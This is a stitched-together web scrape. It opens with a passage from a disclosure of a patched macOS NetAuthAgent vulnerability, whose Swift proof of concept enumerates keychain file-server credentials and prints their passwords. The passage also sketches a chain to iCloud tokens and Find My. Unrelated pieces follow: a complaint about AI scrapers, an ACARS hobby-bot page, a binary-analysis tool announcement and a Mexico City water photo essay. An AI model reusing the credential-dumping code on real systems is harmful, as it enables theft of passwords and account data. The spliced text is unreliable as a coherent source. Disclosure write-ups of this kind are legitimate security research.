    <pre><code>var netAuthAgentInternetPasswords: [[CFString: Any]] {
    var cfItems: CFTypeRef?
    let copyMatchingStatus = SecItemCopyMatching(
        [
            kSecClass: kSecClassInternetPassword,
            kSecReturnAttributes: true,
            kSecMatchLimit: kSecMatchLimitAll,
            kSecReturnRef: true,
        ] as CFDictionary,
        &amp;cfItems
    )
    guard let items = cfItems as? [[CFString: Any]], copyMatchingStatus == errSecSuccess
    else { return [] }
    return items.compactMap {
        item in
        guard let keychainItem = item[kSecValueRef as CFString] as! SecKeychainItem?
        else { return nil }
        guard canNetAuthAgentAccess(keychainItem: keychainItem) else { return nil }
        return item
    }
}</code></pre>
    <p>The access control list is among the metadata that is accessible without privilege, allowing for this code to check if NetAuthAgent is in the list of trusted applications.</p>
    <pre><code>func canNetAuthAgentAccess(keychainItem: SecKeychainItem) -&gt; Bool {
    var access: SecAccess?
    let copyAccessStatus = SecKeychainItemCopyAccess(keychainItem, &amp;access)
    guard let access = access, copyAccessStatus == errSecSuccess else { return false }
    var aclList = CFArrayCreateMutable(nil, 0, nil) as CFArray?
    let copyACLStatus = SecAccessCopyACLList(access, &amp;aclList)
    guard let aclList = aclList, copyACLStatus == errSecSuccess else { return false }
    let acls = aclList as! [SecACL]
    for acl in acls {
        var applicationList = CFArrayCreateMutable(nil, 0, nil) as CFArray?
        var description: CFString?
        var promptSelector: SecKeychainPromptSelector = .init()
        let copyContentsStatus = SecACLCopyContents(
            acl, &amp;applicationList, &amp;description, &amp;promptSelector
        )
        guard let applicationList = applicationList, copyContentsStatus == errSecSuccess else {
            continue
        }
        let applications = applicationList as! [SecTrustedApplication]
        for application in applications {
            var data: CFData? = CFDataCreateMutable(nil, 0)
            let copyRequirementStatus = SecTrustedApplicationCopyData(application, &amp;data)
            guard let data = data as? Data, copyRequirementStatus == errSecSuccess else {
                continue
            }
            let app = String(data: data, encoding: .utf8)
            if app?.contains("/System/Library/CoreServices/NetAuthAgent.app") == true {
                return true
            }
        }
    }
    return false
}</code></pre>
    <p>
      These credentials can then be iterated over in a simple loop like so:
    </p>
    <pre><code>for item in netAuthAgentInternetPasswords {
    let protocolType = item[kSecAttrProtocol as CFString] as! CFString
    let host = item[kSecAttrServer as CFString] as! String
    let port = item[kSecAttrPort as CFString] as? Int
    let path = item[kSecAttrPath as CFString] as? String
    let username = item[kSecAttrAccount as CFString] as? String
    let displayName = item[kSecAttrLabel as CFString] as! String
    print("Item:")
    print("\tDisplay Name: \(displayName)")
    print("\tProtocol: \(protocolType)")
    print("\tHost: \(host)")
    if let port = port { print("\tPort: \(port)") }
    if let path = path { print("\tPath: \(path)") }
    if let username = username { print("\tUsername: \(username)") }
    let credentials = try NetAuthAgentClient().getInternetPassword(
        host: host, port: port, path: path, username: username
    )
    print("Credentials:")
    print("\tUsername: \(credentials.username)")
    print("\tPassword: \(credentials.password)")
}</code></pre>
    <h3>This is bad.</h3>
    <p>This is obviously a pretty bad situation. Before this vulnerability was patched, a malicious process with the ability to get a send right to NetAuthAgent could then leak all the file server credentials. This is especially dangerous as, in corporate environments, these could be <a href="https://en.wikipedia.org/wiki/Single_sign-on"><abbr title="Single sign-on">SSO</abbr> credentials,</a> potentially giving an attacker access to multiple other resources within the corporate system.</p>
    <p>While it is basically impossible to know how many companies are using the <q>Connect to Server</q> feature in Finder to connect ot their file servers (instead of using alternate third-party) clients, it is possible to see <em>other</em> organizations that are likely using it. When doing research for this vulnerability, I found multiple colleges and universities with help articles directing students and faculty to use this feature, with many explicitly telling users to check the box saving the credentials to the keychain.</p>
    <p>One article of note was a print server vendor's instructions on connecting to printers (yes NetAuthAgent handles printer server credentials too). I did also find at least one article instructing users <em>not</em> to check the box, as Apple's Keychain Access app would be too unwieldy for a general user to use if they needed to update the saved password.</p>
    <p>Additionally, while I was unable to confirm it, this could also potentially lead to a privilege escalation attack if those credentials could also be used as superuser credentials on a managed device. It's fairly trivial to <a href="https://gist.github.com/nmggithub/779563215439beb36692957900d9ec1e">silently escalate to root on macOS, if the credentials for an administrative user are known.</a> I did not have a managed device to test with, so I cannot confirm this. However, I recall when I did use a MacBook provided by my employer, I signed into it using my SSO credentials.</p>
    <p>It's also important to understand how this affects individual users as well. If a user has their own <abbr title="network-attached storage">NAS</abbr> and connected to it via Finder (and opted to save the credentials), this vulnerability would expose those credentials to attackers. If that user also reused those credentials for other internet accounts, an attacker could compromise those other accounts as well.</p>
    <p>And of course, barring any additional security checks, this vulnerability allows an attacker to access the files on the server. These files could be literally anything: from a users personal documents to a company's highly sensitive trade secrets. Given that FTP, Samba, and WebDAV all have well-defined interfaces, discovery and exfiltration of files can easily be automated after the credentials are leaked.</p>
    <p>Another, less likely, use of this vulnerability is as a covert data-hiding method for other malicious processes. As NetAuthAgent exposed routines to <em>create</em> keychain items, a particularly crafty malicious process could delegate it to create specific items, stuffing arbitrary data into the <q>password</q> field. When that process needs the data again, it can ask NetAuthAgent to supply it. This avoids writing to disk, which might trigger security software. I'm unaware of any security software that explicitly checks the keychain for suspicious entries. And who would manually check their keychain for such things?</p>
    <p>As a final note, this vulnerability did open up the possibility of a malicious process saving legitimate credentials to the keychain. While this probably wouldn't do anything on it's own, it could be used in a more complex attack where an attacker saves credentials to a file server they control and then social engineers the user into entering the address into the <q>Connect to Server</q> dialog, or similar. How that could progress to a compromise, I am unsure. But it is a possibility.</p>
    <h2>An Exploit Chain</h2>
    <h3>Introduction</h3>
    <p>One might think that if they don't use the <q>Connect to Server</q> option in Finder, that they have nothing to worry about in regards to this vulnerability. <strong><em>They would be wrong.</em></strong> This vulnerability also exposed an exploit chain that allowed attackers access to much more than what has been mentioned above.</p>
    <h3>The Keychain Item</h3>
    <p>Remember how each keychain item has its own access control list? And remember how all NetAuthAgent is doing is proxying keychain requests? It would be <em>really</em> bad if there was a keychain item, that didn't have anything to do with file servers, that had an open enough <abbr title="access control list">ACL</abbr> to where NetAuthAgent could access it.</p>
    <p>It turns out: there is such an item. On basically every macOS device, there is a keychain item that contains‚Ä¶</p>
    <ul>
      <li>‚Ä¶a decryption key‚Ä¶</li>
      <li>‚Ä¶for a file on-disk that contains‚Ä¶</li>
      <li><strong><em>‚Ä¶iCloud account information and API tokens.</em></strong></li>
    </ul>
    <h3>What's in The File?</h3>
    <p>Taking the keychain item and the file (which is at a known location on-disk), an attacker can decrypt the file and gain access to a wealth of information on the iCloud account of the device's user:</p>
    <ul>
      <li>first and last name,</li>
      <li>email address,</li>
      <li>email aliases,</li>
      <li>enabled features and their endpoints,</li>
      <li>multiple long-lasting API tokens, etc.</li>
    </ul>
    <p>This is personal information that I would assume the average user would not want to be exposed in this way. The more dangerous part, though, is the exposure of the API keys. What could an attacker use this for?</p>
    <h3>Using the API Tokens</h3>
    <h4>Previous Work</h4>
    <p>At this point, I am indebted to <a href="https://wojciechregula.blog/post/bypass-tcc-via-icloud/">the work of <span lang="pl">Wojciech Regu≈Ça</span>,</a> a Polish security researcher and <a href="https://www.securing.pl/en/author/wojciechregula/">head of mobile security at Securing.</a> He was able to find these API tokens, albeit through a different method, several years ago. He used the tokens to leak out the user's:</p>
    <ul>
      <li>Contacts,</li>
      <li>Calendars,</li>
      <li>Reminders, and</li>
      <li>even <strong><em>their location through Find My.</em></strong></li>
    </ul>
    <p>I was able to replicate <em>all of this</em>, save for Reminders on newer and migrated accounts as Apple has recently migrated them to the more-secure CloudKit (where they are only accessible in their encrypted form). It's likely that Contacts and Calendars were not given this treatment in an effort to allow for easier integration with third-party software. Tangentially, the Find My network likely doesn't have much additional security around it to better enable smooth operation of the network itself.</p>
    <h4>My Additions</h4>
    <p>I was able to take Wojciech's work and expand upon it, adding the ability to:</p>
    <ul>
      <li>leak contact photos,</li>
      <li>query (but not decrypt) CloudKit,</li>
      <li>leak data from the <a href="https://developer.apple.com/documentation/foundation/nsubiquitouskeyvaluestore">iCloud key-value store,</a></li>
      <li>leak metadata about iCloud backups (including device serial numbers),</li>
      <li><strong><em>leak the locations of the user's other devices through Find My,</em></strong></li>
      <li><strong><em>leak the locations of the user's friends through Find My,</em></strong></li>
      <li>and even perform lock, erase, and <q>play sound</q> operations through Find My.</li>
    </ul>
    <p>I did try to investigate what would be needed to decrypt CloudKit data, and I did get pretty close (at least, I believe I was close), but I was unable to finish and ultimately gave up. However, I would not be surprised if it is within the capabilities of some commercial forensics companies out there to use these API tokens (along with the PIN for an iOS device, if necessary) to decrypt CloudKit data, either directly from CloudKit or (more likely) from the user's iCloud backups.</p>
    <h3>This is <em>really</em> bad.</h3>
    <p>This is now obviously a very bad situation. Not only did this vulnerability expose file server credentials (and all the mess that causes), but it also exposed iCloud API tokens, opening up even more avenues of attack (potentially more than I have even speculated on in this article). And all of this stemmed from one daemon not verifying the senders of messages it received. But wait a minute. How <em>should</em> a daemon do that?</p>
    <h2>What Should Apple Have Done?</h2>
    <p>I am now going to say the one word that a bunch of readers have probably been screaming in their heads for the past while: <b><a href="https://developer.apple.com/documentation/bundleresources/entitlements">entitlements.</a></b> Entitlements, on their own, are simply key-value pairs attached to a binary at code-signing time. At the lowest level (i.e. <a href="https://developer.apple.com/library/archive/documentation/Security/Conceptual/CodeSigningGuide/Procedures/Procedures.html#//apple_ref/doc/uid/TP40005929-CH4-SW13">when using the <code>codesign</code> CLI directly</a>), a binary can be signed with any arbitrary entitlements.</p>
    <p>However, in every macOS device in the standard security configuration, there is a kernel module called Apple Mobile File Integrity that will scan every process that launches and will immediately kill processes that have <q>restricted entitlements</q> that they don't have a proper <b>provisioning profile</b> for. Provisioning profiles have to be signed by Apple, so it's very difficult to get past this check.</p>
    <p>This results in a system where the processes that are running should only have entitlements that were allowed by <abbr title="Apple Mobile File Integrity">AMFI</abbr>. Thus, if you were to check the entitlements of a process, they would serve as a good metric of what the process is entitled (hence the name) to do. This is ultimately what NetAuthAgent should have done, and what it does now. When it receives a message, it first checks the entitlements of the sender. If the sender does not have the entitlements key <code>com.apple.private.netauth.useragent.allow</code> with a boolean value of <code>true</code>, it refuses to respond to the message. This effectively blocks any exploitation of NetAuthAgent's MIG routines.</p>
    <p>But how can a daemon know the sender of a Mach message? Well, remember that a message, when received, has a kernel-appended trailer. This trailer contains, among other things, an <b>audit token</b> that can be used to uniquely identify the sending task. A receiving task can use the audit token and ask the kernel for the entitlements dictionary for the task with that token. It can then parse through that dictionary and act upon the existence (or non-existence) of given entitlements keys and value. Again, this is what NetAuthAgent now does and (honestly) what it should have been doing all along.</p>
    <h2>Conclusion</h2>
    <h3>The Weakest Link</h3>
    <p>Its vulnerabilities like this that call to mind the old phrase <q>a chain is no stronger than its weakest link.</q> The credentials for file servers may have been stored in a way where only a specific application could access them, but if that application also allowed other applications to command it to retrieve those credentials, that's the weakest link. If API tokens to iCloud are stored in an encrypted file on disk, but the decryption key has a wide access control list, that's the weakest link.</p>
    <h3>How Secure is Apple?</h3>
    <p>In my time researching the macOS platform, I have found that Apple generally has good security infrastructure. I've focused primarily on inter-process communication mainly due to the fact that process injection is extremely difficult to achieve with all of Apple's security measures in place. Despite the, honestly laughable, simplicity of this vulnerability (and even the large danger it poses), I don't mean to imply that Apple is bad at security. I would say they are often far better than competitors.</p>
    <p>But that doesn't mean you should trust them implicitly. In early February of 2025, <a href="https://www.washingtonpost.com/technology/2025/02/07/apple-encryption-backdoor-uk/"><cite>The Washington Post</cite> reported that the United Kingdom had ordered that Apple give them access to customer data</a> under the <cite>Investigatory Powers Act of 2016</cite>. Later that month, <a href="https://support.apple.com/en-us/122234">Apple pulled Advanced Data Protection, a more advanced encryption feature, for their <abbr title="United Kingdom">UK</abbr> customers.</a> While some praised Apple for not providing the UK government with <q>a backdoor,</q> I find the act of pulling the feature to still be capitulation. The UK government got what they wanted, which was easier access to the data. And while <a href="https://www.theguardian.com/technology/2025/mar/14/apple-uk-encryption-legal-challenge-heard-behind-closed-doors">Apple is reportedly fighting back against the order,</a> this situation makes it clear that, in the face of overbearing governments, Apple cannot be trusted.</p>
    <h3>My Recommendations</h3>
    <p>For those who still can, I would encourage you to <a href="https://support.apple.com/en-us/108756">enable Advanced Data Protection.</a> Alternatively, if you never use a web browser to access your iCloud, you can at least <a href="https://support.apple.com/en-us/102630">disable web access to iCloud data.</a> The iCloud website sometimes uses different API endpoints than Apple's iCloud apps. I actually did not research these specific endpoints much for this vulnerability, so it's possible they were/are more vulnerable to attacks with the API tokens. While the tokens are no longer accessible through this vulnerability, they <em>were</em> exposed through a previous vulnerability and may be exposed by some later one.</p>
    <p>Finally, while there is no evidence this exploit was ever used (or even found) by malicious actors, if you are particularly concerned that your credentials were exploited through this vulnerability, you should obviously change them. And for anyone who still hasn't updated their macOS devices since October of last year: please update now. I hope this article has accurately informed you on the importance of updating.</p>
    <h3>A Final Question</h3>
    <p>One final question you might have is this: <q>Given that MIG is a legacy communication protocol, largely superseded by XPC, what are the chances there are other vulnerable MIG servers out there?</q></p>
    <p>Until next time... <a target="_self" href="https://wts.dev/feed.xml">watch this space.</a></p>

<div id="readability-page-1" class="page"><div>

<p>LLM and AI companies seem to all be in a race to
<a href="https://drewdevault.com/2025/03/17/2025-03-17-Stop-externalizing-your-costs-on-me.html">breathe the last breath of air</a> in every room
they stumble into. This practice started with larger
websites, ones that already had protection from
malicious usage like denial-of-service and abuse in the form
of services like Cloudflare or Fastly.</p>

<p>But the list of targets has been getting longer.
At this point we're seeing LLM and AI scrapers
<a href="https://thelibre.news/foss-infrastructure-is-under-attack-by-ai-companies/">targeting small project forges</a> like the <a href="https://gitlab.gnome.org/GNOME">GNOME GitLab server</a>.</p>

<p>How long until scrapers start hammering Mastodon servers? Individual websites?
Are we going to have to require authentication or JavaScript challenges on
every web page from here on out?</p>

<p>All this for what, shitty chat bots? What an awful thing that these companies are
doing to the web.</p>

<p>I suggest everyone that uses cloud infrastructure for hosting set-up
a billing limit to avoid an unexpected bill in case they're
caught in the cross-hairs of a negligent company.
All the abusers anonymize their usage at this point, so good luck trying to
get compensated for damages.</p>

      <div id="home" role="tabpanel">
        <p>Welcome to the home of <b>ACARS Drama</b>, the leading provider of aircraft based drama ingestion services.</p>
        
        <p>This small companion website is designed to provide a brief overview of the ACARS Drama project, along with some code snippets and other information regarding the project, and how you can contribute.</p>
        
        <p>The latest drama ingested is shown below:</p>
        <!-- Embedded Mastodon Feed -->

        <h2>A project to map out every broken coffee maker in the sky</h2>
        <!-- The existing content for the What tab starts here -->
        <p>A question I‚Äôve been asked a few times since I took a little project I had for a year or so operating privately under my desk, and turned it into a social media bot.</p>
  
        <p>Note: this post is designed as a more high-level overview of what ACARS/VDLM2 messages are, and what my bot they feed is. So, if you‚Äôre looking for a more detailed technical overview of how the bot works, check out <a href="https://mike-sheward.medium.com/slack-messages-from-the-skies-9ea8ea9366f0">this earlier post from when it was first created as a Slack app</a>.</p>
  
        <p>When an aircraft is flying overhead, various radio signals are being transmitted and received by said aircraft constantly. Some examples of the radio signals, of course, are voice communications between pilots and air traffic controllers, that most people are familiar with. These are, of course, critical for safety, and ensuring planes are at the right altitude, going in the right direction, and at the right speed.</p>
  
        <p>In addition to voice, there are also a boat-load, well, plane-load I guess, of data signals. Amongst these data signals are the two types of signal that feed the bot‚Äôs insatiable thirst for drama. They are ACARS and VDLM2.</p>
  
        <p><strong>ACARS</strong>, which stands for Aircraft Communications Addressing and Reporting System, is a 1970‚Äôs era protocol that is still used today. A bunch of ground stations around the world are used to translate messages between computers in dispatch, maintenance and operations control rooms of the various airlines and their aircraft, and vice-versa, from the aircraft cockpit back to those airline computers.</p>
  
        <p><strong>VDLM2</strong>, which stands for VHF Data Link Mode 2, is similar in that it is a data transmission protocol that works over very high frequency (VHF) radio-waves, but it‚Äôs a bit more modern, uses different frequencies, is a bit faster, and can also carry ACARS messages.</p>
  
        <p>So, in summary, ACARS is where the drama usually is, sometimes transmitted in raw ACARS form, other times it is encapsulated in VDLM2. Same result all round really, you just have to look in a slightly different place to decode the ACARS inside of VDLM2 messages.</p>
  
        <p>Because I am a massive nerd when it comes to both radio stuff and planes (I was a PPL, almost did commercial but got rejected by the flight school I wanted to train at age 17 because I was ‚Äòtoo quiet‚Äô, a problem I later rectified), I was able to buy a few relatively cheap bits of equipment that can listen for these signals from planes flying over my house, and using some open source software that other, much smarter people than me wrote, I was able to decode them. I then wrote some extra bits of software that fixes up the message (extracts only the human readable interesting bits, removes bad formatting etc), and turns it into the posts you see on ACARS Drama. That software also does the job of finding the aircraft photo and adding the tracking link too.</p>
  
        <p>Below is an image of an FMC from a cockpit:</p>
        <p><img src="https://acarsdrama.com/fmc.webp" alt="An FMC from a cockpit‚Äî source http://www.b737.org.uk/fmc.htm"></p><p>Now, because of how the system works, it is extremely hard to capture the ground to air signals, unless you live in close proximity to an airport or ground station, which I do not. So this means that pretty much 99% of what you see on ACARS Drama is air to ground. Essentially one side of a conversation, from the plane to folks on the ground. Sometimes it picks up ground to air, but it‚Äôs rare, and I honestly don‚Äôt know why it works when it does. If you do see a ground to air message, the bot will say ‚ÄúACARS Message To‚Äù instead of ‚ÄúACARS Message From‚Äù.</p>
  
        <p>Because of the sheer volume of the messages it picks up, around 2,000 an hour, most of which are just position and weather data, and automated readings from equipment, it would not be reasonable to post them all via the bot. That would just be annoying. So, I have carefully curated a list of keywords that the bot looks for in the messages received, to ensure that it only shares the ones with human-entered, ‚Äúfree-text‚Äù content. So when you see a message on the bot, it means that a pilot or crew member on the aircraft typed that into their ACARS terminal, which is usually a Flight Management Computer (FMC) device, like the one shown above.</p>
  
        <p>As a message is typed and sent via ACARS, if that plane is in range of one of my antennas (there are two currently being used for the ACARS drama bot), and on a frequency I‚Äôm monitoring (I currently monitor five total ‚Äî 3 ACARS and 2 VDLM2), then it‚Äôll be processed by my software and turned into the bot post that you see on Masto like this:</p>
  
        <p><img src="https://acarsdrama.com/example.webp" alt="Example image showing ACARS message details"></p><p>In this example, the message was captured in a VDLM2 frequency. The transmitting aircraft registration was N305SY, and its flight number was OO3682. OO is the code for Skywest Airlines, and N305SY is an Embraer 175 aircraft. The Track Aircraft link in the bot points to the registration, so you can see where in the sky the plane is at any given time, unless it‚Äôs on the ground of course.</p>
  
        <p>It‚Äôs fair to say that the overwhelming majority of messages transmitted are extremely routine and boring, contrary to the name of the bot ‚Äî which to be honest, is part of the joke. So, you‚Äôll mostly see things about asking for gate confirmations, reporting ‚Äúsnags‚Äù with the aircraft, usually toilet or coffee maker related, but occasionally you‚Äôll see reports of drunk passengers, fights onboard ‚Äî you know, air travel things. That‚Äôs what makes it an interesting and fun project. You also get to see the pilots‚Äô personalities shine through as well, which I love. We all have good days and bad days at work, so you might see the occasional snarky message ‚Äî but ultimately, these are professionals doing a wonderful job in not always the easiest of circumstances.</p>
  
        <p>So that‚Äôs what you‚Äôre seeing and how the bot works. You can follow along at <a href="https://infosec.exchange/@acarsdrama">https://infosec.exchange/@acarsdrama</a> if you aren‚Äôt already.</p>  </div>

        <h2>Harvest your sky drama!</h2>
        <p>If you would like to contribute to ACARS Drama, we'd love to have you! It's very easy to get started, all you need is a $30 SDR (like an RTL-SDR), an antenna, some open source software, and Internet access. This is how:</p>
        
        <h3>Quick Start</h3>
        <p>If you already have an instance of <b>acarsdec, dumpvdlm2, or acars_router</b> running, then all you need to do is include our ingestion endpoint in your configuration.</p>
        
        <p>Send <b>ACARS</b> messages to: <b>feedthe.acarsdrama.com:5550</b></p>
        <p>Send <b>VDLM2</b> messages to: <b>feedthe.acarsdrama.com:5555</b></p>
        <p>The connection can be either UDP or TCP (UDP is preferred), and should be in JSON format (the default for the three tools mentioned above).</p>
        <p>acars_router is required to be able to send acarsdec/dumpvdlm2 traffic to multiple servers, so if you are already feeding elsewhere directly from acarsdec or dumpvdlm2, you will need to introduce an acars_router instance in your pipeline to continue to feed both.</p>
        <p>If you do start feeding, be sure to DM @acarsdrama@infosec.exchange, and let us know where you are!</p>
        <h3>Need a bit more guidance?</h3>
        <p>For information about running your own acarsdec, dumpvdlm2 and acars_router containers, have a read through <a href="https://mike-sheward.medium.com/slack-messages-from-the-skies-9ea8ea9366f0">this earlier post</a>, but remember you only need to do the container bit.</p>
        
        <p>Check out our <a href="https://github.com/msheward287/acars-drama-feeder-configs/blob/main/docker-compose.yml" target="_blank">sample config on Github</a> for an example of how you can set up a minimal container setup to feed the drama engine.</p>

Essentially, GREASE analyzes each function in the target binary by running it on a slate of fully symbolic registers. When errors occur (for example, if the program reads from uninitialized memory), GREASE uses heuristics to refine this initial symbolic precondition (e.g., by initializing some memory) and re-runs the target function. This process continues until GREASE finds a bug, or concludes that the function is safe under some reasonable precondition on its inputs. The <a href="https://www.galois.com/articles/under-constrained-symbolic-execution-with-crucible">blog post introducing UC-Crux</a> describes this algorithm in considerable detail. Further information is also available in <a href="https://galoisinc.github.io/grease/refinement.html">the GREASE documentation</a>.</p><p>In contrast with the above example from libpng, GREASE‚Äôs heuristics will <em>not</em> flag the following program as potentially problematic.</p><pre contenteditable="false"><code><span>$ cat test.c
</span><span>int </span><span>test</span><span>(</span><span>int *x</span><span>)</span><span> { </span><span>return</span><span> *x + </span><span>1</span><span>; }
</span>
$ clang test.c -o test
$ grease test

‚Äì snip ‚Äì
All goals passed!</code></pre><p>‚Äç</p><p>If we ask GREASE for additional details, we can see that it deduces that <code>rdi</code> must point to (at least) four initialized bytes. The heuristics deem this a reasonable precondition for the test function.</p><pre contenteditable="false"><code><span>$ grease test -v

</span>‚Äì snip ‚Äì
<span></span><span>000007</span><span>: XX XX XX XX</span></code></pre><p>‚Äç</p><p>(In the above output, <code>XX</code> indicates a byte of memory initialized to a symbolic value. The syntax of the language used in GREASE‚Äôs output is detailed <a href="https://galoisinc.github.io/grease/shape-dsl.html">in the documentation</a>.)</p><h2>Limitations</h2><p>GREASE has several key limitations. Most importantly, GREASE relies on heuristics to determine whether a fallible memory access should be reported as a bug or not. These heuristics may cause false positives (reporting a normal program behavior as suspicious) or false negatives (missing real bugs).</p><p>Like most program analysis tools, GREASE is subject to a litany of constraints and caveats. GREASE suffers from <a href="https://en.wikipedia.org/wiki/Path_explosion">path explosion</a>. GREASE‚Äôs memory model cannot express unbounded heap data structures (e.g., linked lists of symbolic length). Like other tools based on symbolic execution, GREASE unrolls loops and recursion (optionally up to a maximum bound), and can get stuck when loop conditions remain symbolic. GREASE cannot analyze certain pathological behaviors of machine code, such as run-time code generation (JITs), self-modifying code, or jumps to the ‚Äúmiddle‚Äù of instructions. A more complete accounting of GREASE‚Äôs limitations can be found <a href="https://galoisinc.github.io/grease/limitations.html">in the documentation</a>.</p><h2>Comparison to other tools</h2><p>Where does GREASE fit into the landscape of binary analysis, symbolic execution, and software reverse engineering tools?</p><ul role="list"><li>Concrete testing tools such as fuzzers (e.g., AFL) have the advantage of reporting complete inputs that cause crashes. However, they are more susceptible to path explosion (that is, they can struggle to reach code deep inside the target), and can only test a vanishingly small fraction of possible inputs to a program. Using symbolic execution, GREASE can effectively cover more of the input space.</li><li><a href="https://angr.io/">angr</a> is a toolkit for symbolic execution of binaries. angr is much more mature than GREASE, and is intended for a wider variety of use-cases. angr is first and foremost a Python API that reverse engineers can use to build tools, whereas GREASE provides a ready-to-use CLI. angr performs traditional symbolic execution by default, whereas GREASE performs under-constrained symbolic execution. Like fuzzing, traditional symbolic execution can struggle to reach code deep in the program due to path explosion. angr aggressively concretizes pointers, whereas GREASE‚Äôs memory model is capable of sophisticated symbolic memory operations such as reads and writes involving symbolic pointers and symbolic sizes.</li><li><a href="http://klee-se.org/">KLEE</a> is a widely-used symbolic execution tool for LLVM. In contrast to KLEE, GREASE supports analysis of binaries in addition to LLVM, and performs under-constrained symbolic execution.</li><li>UC-KLEE was an under-constrained symbolic execution tool for LLVM described in ‚ÄúUnder-Constrained Symbolic Execution: Correctness Checking for Real Code‚Äù. To our knowledge, it was never open-sourced. In contrast to UC-KLEE, GREASE supports analysis of binaries in addition to LLVM. UC-KLEE used a lazy memory model, whereas GREASE‚Äôs approach to under-constrained symbolic execution is more iterative in nature.</li><li>UC-Crux was our previous tool for under-constrained symbolic execution of LLVM. Unfortunately, we made two fundamental mistakes in the design of UC-Crux: (1) its core is specialized to analysis of LLVM, limiting its potential applicability to binaries, and (2) its analysis makes use of the types of LLVM pointers. LLVM has phased such types out in favor of the ‚Äúopaque pointer‚Äù type ptr, and accordingly it would be difficult to adapt UC-Crux to work well on recent versions of LLVM. We plan to deprecate UC-Crux in favor of GREASE.</li><li><a href="https://github.com/GaloisInc/macaw">Macaw</a> is a binary analysis framework similar to angr, which is described in the <a href="http://www.arxiv.org/abs/2407.06375">pre-print</a> ‚ÄúMacaw: A Machine Code Toolbox for the Busy Binary Analyst‚Äù. GREASE is built on top of Macaw.</li><li>GREASE can be integrated into binary analysis platforms such as <a href="https://ghidra-sre.org/">Ghidra</a> and <a href="https://binary.ninja/">Binary Ninja</a> as a plugin.</li></ul><h2>Conclusion</h2><p>We are happy to share GREASE with the binary analysis research community under the BSD 3-clause license. GREASE is under active development. Pull requests, issues, and questions are welcome!

<p><span>She draws water from a well in her patio in Ecatepec, but it‚Äôs not fit for drinking. She can, however, use it for filling toilets, cleaning, or laundry. The water is unfiltered, she says, and it has caused her skin problems. </span></p></div><div><p><img alt="Norma, 68 years old, collects unfiltered, nonpotable water from a well in her yard in Ecatepec, Mexico, May 9, 2024." loading="lazy" width="2560" height="1921" decoding="async" data-nimg="1" srcset="https://mexicocitywater.longlead.com/_next/image?url=https%3A%2F%2Fphoto.longlead-cms.decimalstudios.com%2Fwp-content%2Fuploads%2Fsites%2F5%2F2025%2F01%2FMCW_resized-1-scaled.jpg&amp;w=3840&amp;q=75 1x" src="https://mexicocitywater.longlead.com/_next/image?url=https%3A%2F%2Fphoto.longlead-cms.decimalstudios.com%2Fwp-content%2Fuploads%2Fsites%2F5%2F2025%2F01%2FMCW_resized-1-scaled.jpg&amp;w=3840&amp;q=75"><span></span></p><p><span>Norma, 68 years old, collects unfiltered, nonpotable water from a well in her yard in Ecatepec, Mexico, May 9, 2024.
</span></p></div><div><p><span>Though Norma is a widow, she is not alone. As Mexico City continues to expand while resources become scarce, its water crisis impacts millions. It exemplifies a future that cities worldwide could face if global warming and overpopulation continue. From springs that have been sealed or pipelined to rainwater that goes unused and into the drain, to drinking water that gets polluted or spilled on its way into homes across the megalopolis, many issues have created this crisis.</span></p>

<p><span>Norma lives by herself in a small house, which is sinking ‚Äî another byproduct of the Mexican capital‚Äôs unquenchable thirst for water. According to Norma, the bedroom has already descended 20 inches below ground level. She feels constantly under stress, not just from poverty but also from the criminal groups prowling around her neighborhood. She refuses to provide her last name for this report, fearing retaliation.</span></p></div></div><div><div><p><span>Two hours away from Mexico‚Äôs capital, the water reservoir at the town of Valle de Bravo collects most of its water from nearby rivers and springs and is the main source for the Cutzamala water system. This system provides more than a quarter of Mexico City‚Äôs drinking water.</span></p>

<p><span>A complex network of about 45 miles of canals, 26 miles of tunnels, and six siphons, the Cutzamala system also has six pumping stations, 11 dams, 10 reservoirs, a major treatment plant, two storage reservoirs, and four storage reservoirs at the Mexico City terminal. Despite its complexity and engineering, it‚Äôs one of the key pivots in the city‚Äôs water crisis.</span></p></div><div><p><img alt="A tower at the reservoir at Valle de Bravo shows water stains, marking where the water had previously been much higher." loading="lazy" width="2560" height="1921" decoding="async" data-nimg="1" srcset="https://mexicocitywater.longlead.com/_next/image?url=https%3A%2F%2Fphoto.longlead-cms.decimalstudios.com%2Fwp-content%2Fuploads%2Fsites%2F5%2F2025%2F01%2FMCW_resized-2-scaled.jpg&amp;w=3840&amp;q=75 1x" src="https://mexicocitywater.longlead.com/_next/image?url=https%3A%2F%2Fphoto.longlead-cms.decimalstudios.com%2Fwp-content%2Fuploads%2Fsites%2F5%2F2025%2F01%2FMCW_resized-2-scaled.jpg&amp;w=3840&amp;q=75"><span></span></p><p><span>The main reservoir at Valle de Bravo on May 8, 2024. That month, it was at its lowest level ever: 30% capacity. Water stains and markings note the reservoir‚Äôs various levels over the years. 
</span></p></div><div><p><span>Prolonged overuse is one reason the lake has been so critically affected by drought. Agricultural demands, local consumption, and the city‚Äôs water needs have stretched its resources to a breaking point. Climate change has further exacerbated the situation, with erratic rainfall and extended dry seasons making it increasingly difficult to replenish the lake and ensure water stability.</span></p>

<p><span>The water scarcity has fueled social tensions as the Valle de Bravo community struggles to balance its own needs with the obligation to share water with Mexico City. In 2024, the town faced severe challenges due to dwindling water levels, and residents have had to adopt water-saving policies during drought seasons. They have also pushed the government to monitor the illegal diversion of creeks and rivers to wealthy, private properties and the building of unauthorized, restricted lagoons.</span></p></div><div><p><img alt="The Cutzamala system, which provides water to Mexico City from the Cutzamala River, is seen with a drying reservoir." loading="lazy" width="2560" height="1921" decoding="async" data-nimg="1" srcset="https://mexicocitywater.longlead.com/_next/image?url=https%3A%2F%2Fphoto.longlead-cms.decimalstudios.com%2Fwp-content%2Fuploads%2Fsites%2F5%2F2025%2F01%2FMCW_resized-3-scaled.jpg&amp;w=3840&amp;q=75 1x" src="https://mexicocitywater.longlead.com/_next/image?url=https%3A%2F%2Fphoto.longlead-cms.decimalstudios.com%2Fwp-content%2Fuploads%2Fsites%2F5%2F2025%2F01%2FMCW_resized-3-scaled.jpg&amp;w=3840&amp;q=75"><span></span></p><p><span>The Cutzamala system is a complex interbasin transfer network built in three stages, from the late 1970s to 1994, to supply water from the Cutzamala River to the Mexico City metropolitan area, May 8, 2024.
